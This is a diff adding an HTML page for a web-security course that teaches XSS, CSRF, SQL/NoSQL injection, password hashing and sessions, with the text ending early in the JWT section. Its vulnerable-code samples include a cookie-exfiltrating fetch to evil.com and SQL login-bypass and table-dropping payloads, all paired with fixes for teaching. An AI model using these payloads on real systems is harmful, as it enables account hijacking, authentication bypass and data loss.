@@ -1,0 +1,1323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BitJourney - Security: Frontend & Backend</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg-dark: #0b0d14;
+            --blue: #5b7cff;
+            --purple: #7a4bff;
+            --cyan: #28e0ff;
+            --text-light: #e8ecf8;
+            --text-secondary: #b6c0de;
+            --card-bg: rgba(255, 255, 255, 0.05);
+            --border-color: rgba(255, 255, 255, 0.1);
+        }
+        body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-light); min-height: 100vh; position: relative; overflow-x: hidden; }
+        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(91, 124, 255, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(45, 125, 230, 0.1) 1px, transparent 1px); background-size: 50px 50px; animation: gridMove 20s linear infinite; pointer-events: none; z-index: -1; }
+        @keyframes gridMove { 0% { transform: translate(0, 0); } 100% { transform: translate(50px, 50px); } }
+        body::after { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(ellipse at center, rgba(122, 75, 255, 0.1) 0%, rgba(91, 124, 255, 0.05) 50%, transparent 100%); pointer-events: none; z-index: -1; }
+        .header { position: sticky; top: 0; z-index: 100; background: rgba(11, 13, 20, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3); }
+        .header-content { max-width: 1160px; margin: 0 auto; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; }
+        .logo-section { display: flex; align-items: center; gap: 0.75rem; }
+        .logo { font-size: 1.5rem; font-weight: 700; color: var(--text-light); }
+        .premium-badge { background: rgba(255, 255, 255, 0.1); border: 1px solid var(--border-color); color: var(--text-light); padding: 0.25rem 0.75rem; border-radius: 50px; font-size: 0.75rem; font-weight: 500; }
+        .btn { padding: 0.5rem 1.25rem; border-radius: 50px; font-size: 0.875rem; font-weight: 500; text-decoration: none; display: inline-flex; align-items: center; gap: 0.5rem; transition: all 0.3s ease; border: none; cursor: pointer; }
+        .btn-back { background: rgba(255, 255, 255, 0.1); border: 1px solid var(--border-color); color: var(--text-light); }
+        .btn-back:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-1px); }
+        .btn-primary { background: linear-gradient(135deg, var(--blue), var(--cyan)); color: white; box-shadow: 0 4px 15px rgba(91, 124, 255, 0.3); }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(91, 124, 255, 0.4); }
+        .main-content { max-width: 1160px; margin: 0 auto; padding: 2rem; }
+        .course-header { margin-bottom: 2rem; }
+        .course-title { font-size: 2.5rem; font-weight: 700; margin-bottom: 1rem; background: linear-gradient(to right, #1d4ed8, #06b6d4, #2563eb); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; color: transparent; }
+        .course-description { font-size: 1.125rem; color: var(--text-secondary); margin-bottom: 1.5rem; line-height: 1.6; }
+        .course-meta { display: flex; flex-wrap: wrap; gap: 1.5rem; margin-bottom: 1.5rem; }
+        .meta-item { display: flex; align-items: center; gap: 0.5rem; color: var(--text-secondary); font-size: 0.875rem; }
+        .progress-bar { width: 100%; height: 4px; background: rgba(255, 255, 255, 0.1); border-radius: 2px; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--blue), var(--cyan)); width: 0%; transition: width 0.3s ease; }
+        .tabs-container { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2); }
+        .tab-nav { display: flex; background: rgba(255, 255, 255, 0.02); border-bottom: 1px solid var(--border-color); overflow-x: auto; }
+        .tab-button { flex: 1; min-width: 120px; padding: 1rem 1.5rem; background: none; border: none; color: var(--text-secondary); font-size: 0.875rem; font-weight: 500; cursor: pointer; transition: all 0.3s ease; position: relative; white-space: nowrap; }
+        .tab-button:hover { color: var(--text-light); background: rgba(255, 255, 255, 0.05); }
+        .tab-button.active { color: var(--text-light); background: rgba(91, 124, 255, 0.1); }
+        .tab-button.active::after { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, var(--blue), var(--cyan)); }
+        .tab-panel { display: none; padding: 2rem; animation: fadeIn 0.4s ease; }
+        .tab-panel.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .content-card { background: rgba(255,255,255,0.03); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); margin-bottom: 1.5rem; }
+        .content-card h3 { margin-bottom: 1rem; color: var(--blue); display: flex; align-items: center; gap: 10px; }
+        .quiz-option { display: flex; align-items: center; gap: 10px; padding: 0.8rem; background: rgba(255,255,255,0.05); border-radius: 8px; cursor: pointer; margin-bottom: 0.5rem; transition: 0.2s; border: 1px solid transparent; }
+        .quiz-option:hover { background: rgba(255,255,255,0.1); border-color: var(--blue); }
+        .quiz-option input { accent-color: var(--cyan); }
+        .lab-container { display: flex; gap: 1rem; height: 420px; margin-top: 1rem; }
+        .lab-editor, .lab-preview { flex: 1; display: flex; flex-direction: column; border: 1px solid var(--border-color); border-radius: 8px; }
+        .lab-header { background: rgba(255,255,255,0.05); padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--text-secondary); }
+        .lab-textarea { flex: 1; background: #000; color: #0f0; font-family: monospace; padding: 1rem; border: none; resize: none; outline: none; font-size: 0.82rem; }
+        .lab-output { flex: 1; background: #0a0c14; color: #ccc; padding: 1rem; overflow-y: auto; font-family: monospace; font-size: 0.82rem; }
+        .resource-link { color: var(--cyan); text-decoration: none; display: block; margin: 0.5rem 0; }
+        .resource-link:hover { text-decoration: underline; }
+        .evaluation-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin-top: 1.5rem; }
+        .evaluation-column { background: rgba(255, 255, 255, 0.02); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; }
+        .evaluation-title { display: flex; align-items: center; gap: 0.5rem; font-size: 1rem; font-weight: 600; margin-bottom: 1rem; padding-bottom: 0.75rem; border-bottom: 2px solid; }
+        .evaluation-title.essential { color: var(--cyan); border-bottom-color: var(--cyan); }
+        .evaluation-title.important { color: #ffd700; border-bottom-color: #ffd700; }
+        .evaluation-title.advanced { color: #ff6b6b; border-bottom-color: #ff6b6b; }
+        .evaluation-list { list-style: none; display: flex; flex-direction: column; gap: 0.75rem; }
+        .evaluation-list li { color: var(--text-secondary); font-size: 0.875rem; line-height: 1.4; padding-left: 1.5rem; position: relative; }
+        .evaluation-list li::before { content: '•'; position: absolute; left: 0; font-weight: bold; }
+        .evaluation-column:nth-child(1) .evaluation-list li::before { color: var(--cyan); }
+        .evaluation-column:nth-child(2) .evaluation-list li::before { color: #ffd700; }
+        .evaluation-column:nth-child(3) .evaluation-list li::before { color: #ff6b6b; }
+        @media (max-width: 768px) { .evaluation-grid { grid-template-columns: 1fr; } }
+        .quiz-controls { display: flex; gap: 1rem; margin: 2rem 0; justify-content: center; }
+        .quiz-results { background: linear-gradient(135deg, rgba(91, 124, 255, 0.1), rgba(40, 224, 255, 0.05)); border: 1px solid rgba(91, 124, 255, 0.2); border-radius: 8px; padding: 1.5rem; margin-top: 2rem; }
+        .results-title { color: var(--cyan); font-size: 1.1rem; font-weight: 600; margin-bottom: 1rem; text-align: center; }
+        .quiz-score { text-align: center; font-size: 1.25rem; font-weight: 600; margin-bottom: 1rem; }
+        .feedback-item { display: flex; align-items: flex-start; gap: 1rem; padding: 1rem; border-radius: 8px; margin-bottom: 1rem; background: rgba(255, 255, 255, 0.03); }
+        .feedback-correct { border-left: 4px solid #10b981; }
+        .feedback-incorrect { border-left: 4px solid #ef4444; }
+        .feedback-icon { font-weight: bold; font-size: 1.2rem; flex-shrink: 0; }
+        .feedback-correct .feedback-icon { color: #10b981; }
+        .feedback-incorrect .feedback-icon { color: #ef4444; }
+        .score-excellent { color: #10b981; font-size: 2rem; font-weight: bold; }
+        .score-good { color: #f59e0b; font-size: 2rem; font-weight: bold; }
+        .score-poor { color: #ef4444; font-size: 2rem; font-weight: bold; }
+        .correct-answer { color: #ef4444; font-weight: 600; }
+        .threat-badge { display: inline-block; padding: 0.15rem 0.5rem; border-radius: 4px; font-size: 0.72rem; font-weight: 600; margin-left: 0.5rem; }
+        .threat-critical { background: rgba(255,50,50,0.2); color: #ff5555; border: 1px solid rgba(255,50,50,0.3); }
+        .threat-high { background: rgba(255,150,0,0.2); color: #ff9900; border: 1px solid rgba(255,150,0,0.3); }
+        .threat-medium { background: rgba(255,220,0,0.2); color: #ffd700; border: 1px solid rgba(255,220,0,0.3); }
+    </style>
+</head>
+<body>
+
+<header class="header">
+    <div class="header-content">
+        <div class="logo-section">
+            <div class="logo">BitJourney</div>
+            <span class="premium-badge">Premium</span>
+        </div>
+        <nav style="display:flex;gap:1rem;">
+            <a href="premium.html" class="btn btn-back">← Back</a>
+            <a href="browse.html" class="btn btn-primary">Browse</a>
+        </nav>
+    </div>
+</header>
+
+<main class="main-content">
+    <div class="course-header">
+        <h1 class="course-title">Goal: Security — Frontend & Backend</h1>
+        <p class="course-description">
+            Security is not a feature you add at the end — it's a discipline you practise throughout the entire development lifecycle. In this module you will master the most critical attack vectors targeting web applications, understand how they work at a technical level, and learn the concrete defences that stop them.<br>
+            From XSS and CSRF on the frontend to SQL Injection, authentication flaws, and secrets management on the backend — you will learn to think like an attacker so you can defend like an engineer.
+        </p>
+        <div class="course-meta">
+            <div class="meta-item"><span>⏱</span><span>9–11h</span></div>
+            <div class="meta-item"><span>🎯</span><span>• XSS • CSRF • SQL Injection • Auth & JWT • HTTPS • CORS • CSP • Rate Limiting</span></div>
+            <div class="meta-item"><span>📌</span><span>Basic knowledge of HTML, JavaScript and HTTP</span></div>
+        </div>
+        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+        <p style="font-size: 0.8rem; margin-top: 5px; color: var(--text-secondary);">Progress: <span id="progress-text">0%</span></p>
+    </div>
+
+    <div class="tabs-container">
+        <nav class="tab-nav">
+            <button class="tab-button active" onclick="openTab(event, 'learn')">Learn</button>
+            <button class="tab-button" onclick="openTab(event, 'lab')">Lab</button>
+            <button class="tab-button" onclick="openTab(event, 'quiz')">Quiz</button>
+            <button class="tab-button" onclick="openTab(event, 'resources')">Resources</button>
+            <button class="tab-button" onclick="openTab(event, 'evaluation')">Evaluation</button>
+        </nav>
+
+        <!-- ═══════════════════════════ LEARN ═══════════════════════════ -->
+        <div id="learn" class="tab-panel active">
+
+    <!-- 1.1 The Security Mindset -->
+    <div class="content-card">
+        <h2 style="color: var(--cyan); margin-bottom: 1rem;">🛡️ 1.1 The Security Mindset — Think Like an Attacker</h2>
+        <p style="line-height: 1.7;">Most security vulnerabilities are not exotic or obscure — they are predictable, well-documented, and preventable. The reason they keep appearing in production systems is that developers focus on the <em>happy path</em> and never ask: <strong>"What happens if a malicious user sends unexpected input?"</strong></p>
+        <br>
+        <p style="line-height: 1.7;">The security mindset means treating every piece of incoming data as potentially hostile, every API endpoint as a target, and every secret as already leaked. It means asking "how could this be abused?" before writing every line of code that handles user data.</p>
+
+        <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap:1rem; margin-top:1.5rem;">
+            <div style="background:rgba(255,50,50,0.07);border:1px solid rgba(255,50,50,0.2);padding:1rem;border-radius:8px;text-align:center;">
+                <div style="font-size:1.8rem;">🎯</div>
+                <strong style="color:#ff5555;">Attack Surface</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.4rem;">Every input field, URL param, API endpoint, and cookie is a potential entry point</p>
+            </div>
+            <div style="background:rgba(91,124,255,0.07);border:1px solid rgba(91,124,255,0.2);padding:1rem;border-radius:8px;text-align:center;">
+                <div style="font-size:1.8rem;">🔒</div>
+                <strong style="color:var(--blue);">Defence in Depth</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.4rem;">Multiple layers of security — if one fails, others catch the attack</p>
+            </div>
+            <div style="background:rgba(40,224,255,0.07);border:1px solid rgba(40,224,255,0.2);padding:1rem;border-radius:8px;text-align:center;">
+                <div style="font-size:1.8rem;">🚫</div>
+                <strong style="color:var(--cyan);">Least Privilege</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.4rem;">Users and services get only the minimum access needed to perform their function</p>
+            </div>
+            <div style="background:rgba(122,75,255,0.07);border:1px solid rgba(122,75,255,0.2);padding:1rem;border-radius:8px;text-align:center;">
+                <div style="font-size:1.8rem;">🔍</div>
+                <strong style="color:var(--purple);">Zero Trust</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.4rem;">Never trust, always verify — even requests from inside your own network</p>
+            </div>
+        </div>
+
+        <div style="background:rgba(255,255,255,0.03);border-left:4px solid #ff5555;padding:1rem;border-radius:0 8px 8px 0;margin-top:1.5rem;">
+            <strong>📋 The OWASP Top 10 — The Industry's Most Authoritative Vulnerability List:</strong>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.4rem;margin-top:0.8rem;font-size:0.82rem;color:var(--text-secondary);">
+                <div>A01 — Broken Access Control <span class="threat-badge threat-critical">Critical</span></div>
+                <div>A02 — Cryptographic Failures <span class="threat-badge threat-critical">Critical</span></div>
+                <div>A03 — Injection (SQL, XSS, etc.) <span class="threat-badge threat-critical">Critical</span></div>
+                <div>A04 — Insecure Design <span class="threat-badge threat-high">High</span></div>
+                <div>A05 — Security Misconfiguration <span class="threat-badge threat-high">High</span></div>
+                <div>A06 — Vulnerable Components <span class="threat-badge threat-high">High</span></div>
+                <div>A07 — Auth & Identity Failures <span class="threat-badge threat-critical">Critical</span></div>
+                <div>A08 — Software Integrity Failures <span class="threat-badge threat-high">High</span></div>
+                <div>A09 — Logging & Monitoring Failures <span class="threat-badge threat-medium">Medium</span></div>
+                <div>A10 — Server-Side Request Forgery <span class="threat-badge threat-high">High</span></div>
+            </div>
+            <p style="font-size:0.8rem;color:var(--text-secondary);margin-top:0.8rem;">This module covers A01, A02, A03, A05, and A07 in depth — the vulnerabilities most likely to appear in the applications you build.</p>
+        </div>
+    </div>
+
+    <!-- 1.2 XSS -->
+    <div class="content-card">
+        <h3>💉 1.2 Cross-Site Scripting (XSS) <span class="threat-badge threat-critical">Critical</span></h3>
+        <p>XSS is one of the most prevalent vulnerabilities on the web. It occurs when an attacker injects malicious JavaScript into a page that other users then execute in their browsers. The attacker's script runs in the victim's session — it can steal cookies, hijack accounts, redirect to phishing pages, or silently exfiltrate data.</p>
+
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1rem;margin-top:1.2rem;">
+            <div style="background:rgba(255,50,50,0.07);border:1px solid rgba(255,50,50,0.2);padding:1.2rem;border-radius:8px;">
+                <strong style="color:#ff5555;">🔴 Stored XSS</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.4rem;">Malicious script is <strong>saved in the database</strong> (e.g. in a comment or profile name) and served to every user who views that content. Most dangerous type.</p>
+            </div>
+            <div style="background:rgba(255,150,0,0.07);border:1px solid rgba(255,150,0,0.2);padding:1.2rem;border-radius:8px;">
+                <strong style="color:#ff9900;">🟠 Reflected XSS</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.4rem;">Script is embedded in a URL parameter and <strong>reflected back</strong> in the response. The victim must be tricked into clicking a crafted link.</p>
+            </div>
+            <div style="background:rgba(255,220,0,0.07);border:1px solid rgba(255,220,0,0.2);padding:1.2rem;border-radius:8px;">
+                <strong style="color:#ffd700;">🟡 DOM-based XSS</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.4rem;">Script is injected via <strong>client-side JavaScript</strong> that reads attacker-controlled data (like <code>location.hash</code>) and writes it unsafely to the DOM.</p>
+            </div>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-top:1.2rem;">
+            <div>
+                <div style="background:#000;padding:1rem;border-radius:8px;">
+                    <p style="color:#ff5555;font-size:0.75rem;margin-bottom:0.5rem;">❌ VULNERABLE — unsanitised output</p>
+                    <pre style="font-size:0.78rem;color:#ff6b6b;overflow-x:auto;line-height:1.8;"><code>// User submits: &lt;script&gt;document.cookie&lt;/script&gt;
+// Server renders:
+&lt;p&gt;Hello, &lt;script&gt;
+  fetch('https://evil.com?c=' + document.cookie)
+&lt;/script&gt;&lt;/p&gt;
+// Browser executes the script — cookies stolen!
+
+// Also dangerous in JavaScript:
+element.innerHTML = userInput;        // XSS
+document.write(userInput);            // XSS
+eval(userInput);                      // XSS</code></pre>
+                </div>
+            </div>
+            <div>
+                <div style="background:#000;padding:1rem;border-radius:8px;">
+                    <p style="color:#0f0;font-size:0.75rem;margin-bottom:0.5rem;">✅ SAFE — escaped output</p>
+                    <pre style="font-size:0.78rem;color:#0f0;overflow-x:auto;line-height:1.8;"><code>// Server-side: escape before rendering
+// React does this automatically!
+&lt;p&gt;Hello, {username}&lt;/p&gt;  // Safe — JSX escapes by default
+
+// Safe DOM manipulation
+element.textContent = userInput;      // Safe
+element.setAttribute('value', input); // Safe
+
+// If you MUST use innerHTML, sanitise first:
+import DOMPurify from 'dompurify';
+element.innerHTML = DOMPurify.sanitize(userInput);</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <strong>🛡️ Content Security Policy (CSP) — The Ultimate XSS Defence</strong>
+            <p style="font-size:0.83rem;color:var(--text-secondary);margin-top:0.5rem;">CSP is an HTTP header that tells the browser <em>which sources are allowed to execute scripts</em>. Even if an XSS injection occurs, CSP blocks the malicious script from running.</p>
+            <div style="background:#000;padding:0.8rem;border-radius:6px;margin-top:0.6rem;">
+                <pre style="font-size:0.78rem;color:#0f0;overflow-x:auto;line-height:1.8;"><code># Strict CSP — only scripts from your own origin, no inline scripts
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-{RANDOM_NONCE}';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https://cdn.example.com;
+  connect-src 'self' https://api.example.com;
+  frame-ancestors 'none';
+
+# Each page gets a fresh random nonce:
+&lt;script nonce="abc123"&gt;/* only this script runs */&lt;/script&gt;</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- 1.3 CSRF -->
+    <div class="content-card">
+        <h3>🔄 1.3 Cross-Site Request Forgery (CSRF) <span class="threat-badge threat-high">High</span></h3>
+        <p>CSRF tricks an authenticated user's browser into making an unintended request to your server. Because the browser automatically includes cookies with every request to a domain, the server cannot tell the difference between a legitimate request and a forged one — unless you implement explicit protections.</p>
+
+        <div style="background:rgba(255,50,50,0.06);border:1px solid rgba(255,50,50,0.2);padding:1.2rem;border-radius:8px;margin-top:1.2rem;">
+            <strong style="color:#ff5555;">⚠️ Classic CSRF Attack Scenario:</strong>
+            <ol style="font-size:0.83rem;color:var(--text-secondary);margin-top:0.6rem;line-height:2;padding-left:1.2rem;">
+                <li>Alice is logged into her bank at <code>bank.com</code> (session cookie active)</li>
+                <li>Alice visits a malicious site controlled by an attacker</li>
+                <li>The malicious page silently sends: <code>POST bank.com/transfer?to=attacker&amount=5000</code></li>
+                <li>Alice's browser automatically includes her <code>bank.com</code> session cookie</li>
+                <li>The bank processes the transfer — Alice loses money, never clicked anything</li>
+            </ol>
+        </div>
+
+        <div style="background:#000;padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <p style="color:var(--cyan);font-size:0.75rem;margin-bottom:0.5rem;">CSRF DEFENCES</p>
+            <pre style="font-size:0.78rem;color:#0f0;overflow-x:auto;line-height:1.9;"><code>// 1. CSRF Tokens — most reliable defence
+// Server generates a unique token per session:
+&lt;form action="/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="_csrf" value="a8f3...b2c9"&gt;
+  ...
+&lt;/form&gt;
+// Server validates the token matches the session — forged requests lack it
+
+// 2. SameSite Cookie Attribute — modern browser defence
+Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
+// SameSite=Strict: cookie NOT sent on cross-site requests at all
+// SameSite=Lax: cookie sent on top-level navigation (e.g. links) but not POST
+
+// 3. Check Origin / Referer headers
+// Reject requests where Origin doesn't match your domain
+app.use((req, res, next) => {
+  const origin = req.headers.origin;
+  if (req.method !== 'GET' && origin !== 'https://yourdomain.com') {
+    return res.status(403).json({ error: 'CSRF detected' });
+  }
+  next();
+});</code></pre>
+        </div>
+    </div>
+
+    <!-- 1.4 SQL Injection -->
+    <div class="content-card">
+        <h3>🗄️ 1.4 SQL Injection <span class="threat-badge threat-critical">Critical</span></h3>
+        <p>SQL Injection is one of the oldest and most destructive vulnerabilities. It occurs when user-supplied data is directly concatenated into a SQL query, allowing attackers to manipulate the query logic — reading any data in the database, bypassing authentication, modifying records, or deleting entire tables.</p>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-top:1.2rem;">
+            <div>
+                <div style="background:#000;padding:1rem;border-radius:8px;">
+                    <p style="color:#ff5555;font-size:0.75rem;margin-bottom:0.5rem;">❌ VULNERABLE — string concatenation</p>
+                    <pre style="font-size:0.78rem;color:#ff6b6b;overflow-x:auto;line-height:1.8;"><code>// Attacker enters username:
+// ' OR '1'='1
+const query = `
+  SELECT * FROM users
+  WHERE username = '${req.body.username}'
+  AND password = '${req.body.password}'
+`;
+// Becomes:
+// WHERE username = '' OR '1'='1'
+// AND password = ''
+// '1'='1' is always true — login bypassed!
+
+// Worse: '; DROP TABLE users; --
+// Destroys the entire users table</code></pre>
+                </div>
+            </div>
+            <div>
+                <div style="background:#000;padding:1rem;border-radius:8px;">
+                    <p style="color:#0f0;font-size:0.75rem;margin-bottom:0.5rem;">✅ SAFE — parameterised queries</p>
+                    <pre style="font-size:0.78rem;color:#0f0;overflow-x:auto;line-height:1.8;"><code>// Always use parameterised queries / prepared statements
+// The database treats $1 as DATA, never as SQL code
+
+// node-postgres (pg)
+const result = await db.query(
+  'SELECT * FROM users WHERE username = $1 AND password = $2',
+  [req.body.username, hashedPassword]
+);
+
+// Prisma ORM (safe by default)
+const user = await prisma.user.findFirst({
+  where: { username: req.body.username }
+});
+
+// Drizzle ORM (safe by default)
+const user = await db.select()
+  .from(users)
+  .where(eq(users.username, req.body.username));</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <div style="background:rgba(40,224,255,0.06);border:1px solid rgba(40,224,255,0.2);padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <strong style="color:var(--cyan);">🔑 The Golden Rule of SQL Security:</strong>
+            <p style="font-size:0.85rem;color:var(--text-secondary);margin-top:0.5rem;"><strong>Never concatenate user input into a query string.</strong> Always use parameterised queries, prepared statements, or a trusted ORM. This single rule prevents 100% of SQL injection attacks. No exceptions, no special cases.</p>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1.2rem;">
+            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1rem;border-radius:8px;">
+                <strong style="color:var(--cyan);">🔍 NoSQL Injection</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.5rem;">MongoDB is also vulnerable if you pass user input directly as query operators:</p>
+                <div style="background:#000;padding:0.5rem;border-radius:4px;margin-top:0.5rem;">
+                    <pre style="font-size:0.74rem;color:#ff6b6b;overflow-x:auto;"><code>// Attacker sends: { "username": {"$gt": ""} }
+// Matches ALL users — auth bypass!
+User.find({ username: req.body.username });
+
+// Fix: validate and sanitise input types
+// Use Zod or Joi to ensure username is a string</code></pre>
+                </div>
+            </div>
+            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1rem;border-radius:8px;">
+                <strong style="color:var(--cyan);">🔒 Principle of Least Privilege (DB)</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.5rem;">Your application's database user should have only the permissions it needs:</p>
+                <div style="background:#000;padding:0.5rem;border-radius:4px;margin-top:0.5rem;">
+                    <pre style="font-size:0.74rem;color:#0f0;overflow-x:auto;"><code>-- Create a restricted user
+CREATE USER app_user WITH PASSWORD 'xxx';
+GRANT SELECT, INSERT, UPDATE ON users TO app_user;
+-- Never: GRANT ALL PRIVILEGES
+-- Never connect as postgres/root</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 1.5 Authentication & Password Security -->
+    <div class="content-card">
+        <h3>🔑 1.5 Authentication & Password Security <span class="threat-badge threat-critical">Critical</span></h3>
+        <p>Authentication is the process of verifying who a user is. It's one of the most critical and most commonly broken aspects of web security. A weak authentication system is the front door to your entire application.</p>
+
+        <div style="background:#000;padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <p style="color:var(--cyan);font-size:0.75rem;margin-bottom:0.5rem;">PASSWORD HASHING — ALWAYS USE bcrypt, scrypt, OR argon2</p>
+            <pre style="font-size:0.78rem;color:#0f0;overflow-x:auto;line-height:1.9;"><code>import bcrypt from 'bcrypt';
+
+// NEVER store plain text passwords
+// NEVER use MD5 or SHA-1 — they are fast, which makes them brute-forceable
+
+// Registration: hash the password
+const SALT_ROUNDS = 12; // Higher = slower = more secure
+const hashedPassword = await bcrypt.hash(plainTextPassword, SALT_ROUNDS);
+await db.users.create({ email, password: hashedPassword });
+
+// Login: compare against the hash
+const isValid = await bcrypt.compare(plainTextPassword, user.password);
+if (!isValid) return res.status(401).json({ error: 'Invalid credentials' });
+
+// Why bcrypt? It's intentionally SLOW — 12 rounds = ~300ms per hash
+// A brute-force attack with 1 billion guesses/sec would take 1000+ years</code></pre>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-top:1.2rem;">
+            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1.2rem;border-radius:8px;">
+                <strong style="color:var(--cyan);">🔐 Multi-Factor Authentication (MFA)</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.5rem;">MFA requires something the user <em>knows</em> (password) plus something they <em>have</em> (phone, hardware key) or <em>are</em> (biometric). Even if the password is leaked, the account stays secure.</p>
+                <ul style="list-style:none;font-size:0.8rem;color:var(--text-secondary);margin-top:0.6rem;line-height:2;">
+                    <li>→ TOTP (Time-based OTP) — Google Authenticator, Authy</li>
+                    <li>→ SMS OTP — convenient but vulnerable to SIM swapping</li>
+                    <li>→ Hardware keys — FIDO2/WebAuthn (strongest)</li>
+                    <li>→ Magic links — passwordless email verification</li>
+                </ul>
+            </div>
+            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1.2rem;border-radius:8px;">
+                <strong style="color:var(--cyan);">🚫 Account Enumeration Prevention</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.5rem;">Never reveal whether a username/email exists in your system. Use generic error messages and consistent response times.</p>
+                <div style="background:#000;padding:0.5rem;border-radius:4px;margin-top:0.6rem;">
+                    <pre style="font-size:0.74rem;color:#0f0;overflow-x:auto;line-height:1.8;"><code>// BAD — reveals account existence
+"No account with this email"
+"Wrong password for this email"
+
+// GOOD — same message always
+"Invalid email or password"
+
+// Timing attack prevention:
+// Always call bcrypt.compare even if user not found
+// to ensure consistent response time</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 1.6 JWT & Session Security -->
+    <div class="content-card">
+        <h3>🎟️ 1.6 JWT & Session Security</h3>
+        <p>After authentication, the server needs a way to remember who the user is on subsequent requests. The two main approaches are <strong>server-side sessions</strong> (stored in Redis/database) and <strong>JWT tokens</strong> (self-contained, stored client-side). Both have security implications.</p>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-top:1.2rem;">
+            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1.2rem;border-radius:8px;">
+                <strong style="color:var(--cyan);">🗄️ Server-Side Sessions</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.5rem;">A session ID (opaque random string) is stored in a cookie. The actual session data lives in Redis or a database on the server.</p>
+                <ul style="list-style:none;font-size:0.8rem;margin-top:0.6rem;line-height:2;">
+                    <li style="color:#10b981;">✅ Easy to revoke (delete from Redis)</li>
+                    <li style="color:#10b981;">✅ No sensitive data on the client</li>
+                    <li style="color:#f59e0b;">⚠ Requires shared session store for scaling</li>
+                </ul>
+            </div>
+            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1.2rem;border-radius:8px;">
+                <strong style="color:var(--cyan);">🎫 JWT (JSON Web Tokens)</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.5rem;">A signed token containing the user's claims, stored client-side. The server validates the signature on every request.</p>
+                <ul style="list-style:none;font-size:0.8rem;margin-top:0.6rem;line-height:2;">
+                    <li style="color:#10b981;">✅ Stateless — works across multiple servers</li>
+                    <li style="color:#f59e0b;">⚠ Cannot be revoked without extra infrastructure</li>
+                    <li style="color:#ef4444;">❌ Never store sensitive data in payload (it's base64, not encrypted)</li>
+                </ul>
+            </div>
+        </div>
+
+        <div style="background:#000;padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <p style="color:var(--cyan);font-size:0.75rem;margin-bottom:0.5rem;">JWT SECURITY — COMMON MISTAKES AND FIXES</p>
